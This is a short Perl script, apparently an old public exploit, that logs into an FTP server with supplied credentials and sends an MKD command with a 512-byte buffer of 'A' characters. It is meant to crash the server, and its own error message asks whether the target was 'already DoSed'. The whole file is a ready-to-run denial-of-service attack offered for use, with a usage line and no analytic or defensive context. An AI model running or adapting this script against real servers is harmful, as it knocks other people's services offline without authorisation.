#!/usr/bin/perl
use IO::Socket;

$target = shift || useage ();
$port = shift || useage ();
$user = shift || useage ();
$pass = shift || useage ();

print"[*] Connecting to $target on port $port\n";
my $sock = IO::Socket::INET -> new
(
Proto => 'tcp',
PeerAddr => $target,
PeerPort => $port
)or die ("Cannot Connect, Have you already DoSed It?\n");
print"[*] Connected, Logging In...\n";
sleep 3;
$sock -> send ("USER $user\r\n");
sleep 3;
$sock -> send ("PASS $pass\r\n");
while ($data = <$sock>)
{
  if ($data =~ /230/)
  {
    print"[*] Logged In\n";
    last;
  }
}
print"[*] Creating 512-byte Buffer\n";
$buffer = 'A' x 512;
print"[*] Sending Exploit\n";
$sock -> send ("MKD $buffer\r\n");
print"[*] Exploit Sent\n";
exit;

sub useage ()
{
  print "Useage: $0 <Host> <Port> <Username> <Password>\n";
  exit;
}
#Coded By Samsta http://theshelljunkies.clawz.com
